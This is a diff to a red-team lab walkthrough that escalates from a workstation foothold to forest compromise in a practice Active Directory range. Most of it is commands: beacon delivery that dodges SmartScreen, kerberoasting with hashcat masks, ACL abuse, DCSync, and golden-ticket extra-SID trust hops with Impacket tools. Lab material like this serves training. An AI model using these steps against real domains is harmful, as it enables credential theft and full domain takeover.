@@ -9,12 +9,12 @@ workstation user finds a kerberoastable service account, that account can write
 to a group it should not, the group can force a password change on the child
 domain admin, and that child admin walks the trust into the root.
 
-> **Status: authored from the lab's own template, not yet run against a live
-> range.** Every host, user, credential and ACL edge below was read out of
-> `frontend/public/harbor.json`. The commands follow the usual redStackPRO shape
-> but carry no "Live verification" block and should not be trusted the way the
-> validated parts of the [GOAD series](../goad/README.md) can be. Verify on a
-> deploy before relying on it.
+> **Status: verified live on AWS, 2026-09-26.** The chain was run end to end from a
+> beacon in patient zero's context through the portal. Steps 0 to 4 are confirmed on
+> a real deploy; step 5 (the trust hop) behaves as a patched forest does, see its
+> note. Two operational details the live run pinned down: `svc.reports`' password is
+> a season+year that a plain wordlist misses (step 2), and patient zero has to be a
+> Remote Desktop Users member for the portal tile to open (step 0).
 
 ## Methodology
 
@@ -109,6 +109,22 @@ proxychains bloodhound-python -d freight.harbor.corp -u dana.brooks -p '<pw>' \
   -c all -ns 172.20.10.11
 ```
 
+Patient zero is reached through the portal's patient-zero tile, an RDP session as
+`dana.brooks` (she has to be a Remote Desktop Users member on `fr-wks01` for the tile
+to open, which the range grants). Landing the first payload is the practical hurdle:
+the tile carries a shared drive (GuacShare) you can drop a file into, but if the
+browser upload stalls, smuggle the payload in over the range's own management plane
+instead, which is more reliable and leaves no mark-of-the-web to raise SmartScreen:
+
+```
+# SSH the file to the jumpbox's shared drop, then pull it in from the RDP session:
+scp beacon.exe <rangeuser>@<jumpbox>:/opt/redstackpro/drop/
+# or copy it straight onto the host over WinRM from the jumpbox (Ansible or a PSSession):
+ansible <wks> -m ansible.windows.win_copy -a 'src=beacon.exe dest=C:\Users\Public\beacon.exe'
+```
+
+Run the beacon in the `dana.brooks` session so the chain starts at patient zero.
+
 ### 1. Poison the segment for a first captured hash (optional)
 
 `fr-dc01` declares `llmnr_poisoning` and `nbtns_poisoning`, so the flat subnet
@@ -122,14 +138,21 @@ proxychains responder -I <iface>         # capture NetNTLMv2, then crack offline
 
 ### 2. Kerberoast the child, crack the weak password
 
-`svc.reports` has an SPN and a weak password, so it roasts and cracks quickly.
-This is the account the ACL chain hangs off.
+`svc.reports` has an SPN and a weak password, so it roasts and cracks. This is the
+account the ACL chain hangs off.
 
 ```
 proxychains GetUserSPNs.py -dc-ip 172.20.10.11 -request \
   'freight.harbor.corp/dana.brooks:<pw>'
-# crack the svc.reports ticket; the password is a common, guessable one
-hashcat -m 13100 svc.reports.tgs wordlist.txt
+```
+
+The password is a season and a year (read it from the briefing). That shape is weak
+but a stock 2009 wordlist like rockyou does not contain it, so a plain `wordlist.txt`
+run misses it. Crack it with a mask or a rule instead:
+
+```
+hashcat -m 13100 svc.reports.tgs -a 3 '?u?l?l?l?l?l2024'      # season + year mask
+hashcat -m 13100 svc.reports.tgs -a 0 rockyou.txt -r rules/best64.rule   # or a rule
 ```
 
 ### 3. Abuse the ACL: GenericWrite then ForceChangePassword
@@ -172,9 +195,22 @@ admin.
 ```
 # with the child krbtgt hash and the root domain SID:
 proxychains ticketer.py -nthash <child-krbtgt> -domain freight.harbor.corp \
-  -domain-sid <freight-sid> -extra-sid <harbor-sid>-519 hq-admin
+  -domain-sid <freight-sid> -extra-sid <harbor-sid>-519 Administrator
 proxychains secretsdump.py -k -no-pass hq-dc01.harbor.corp   # DCSync the root
+# or automate the whole child-to-parent step from child domain admin creds:
+proxychains raiseChild.py 'freight.harbor.corp/<child-da>:<pw>'
 ```
+
+Live note: the intra-forest trust applies no SID filtering (`trustAttributes:
+WITHIN_FOREST`), so the technique is architecturally available, and the child
+`krbtgt` plus both domain SIDs are recovered cleanly. But against fully patched
+domain controllers (the 2021 PAC hardening, KB5008380 / CVE-2021-42287), a golden
+ticket carrying an injected Enterprise Admins SID is rejected at the root DC
+(`KDC_ERR_TGT_REVOKED`, replication access denied) unless the forged ticket carries
+a valid PAC_REQUESTOR. On a patched deploy this last hop needs PAC-aware tooling; on
+an unpatched forest the ticket above lands directly. Either way the root is one
+tooling step from full compromise, so this is the loudest, most detectable rung to
+attempt against a monitored, patched forest.
 
 ### Alternate ways up
 
@@ -200,14 +236,14 @@ hosts.
 
 | step | result | notes |
 |------|--------|-------|
-| 0 foothold as dana.brooks | | patient zero, `stored_credential` on fr-wks01 |
-| 1 LLMNR/NBT-NS poisoning | | optional first hash |
-| 2 kerberoast svc.reports | | weak password, cracks |
-| 3 GenericWrite then ForceChangePassword | | freight ACL chain |
-| 4 child domain admin (eric.vance) | | |
-| 5 trust hop to enterprise admin | | golden ticket + extra-SID |
-| alt roast svc.backup (root) | | direct path up |
-| alt unconstrained delegation (fr-app01) | | coerce a DC |
+| 0 foothold as dana.brooks | verified | beacon as patient zero over the portal tile; needs RDP-users membership (granted by the range) |
+| 1 LLMNR/NBT-NS poisoning | not tested | optional first hash, skipped this run |
+| 2 kerberoast svc.reports | verified | SPN found, TGS cracked; season+year password needs a mask/rule, not plain rockyou |
+| 3 GenericWrite then ForceChangePassword | verified | svc.reports added to App Maintainers, eric.vance password force-changed |
+| 4 child domain admin (eric.vance) | verified | eric.vance in Domain Admins, DCSync of the freight krbtgt succeeds |
+| 5 trust hop to root | partial | child krbtgt + both domain SIDs recovered; golden+extra-SID rejected by patched-DC PAC hardening (see note) |
+| alt roast svc.backup (root) | not tested | direct path up |
+| alt unconstrained delegation (fr-app01) | not tested | coerce a DC |
 
 Attribution: harbor is a redStackPRO original. Built and documented in our own
 words.
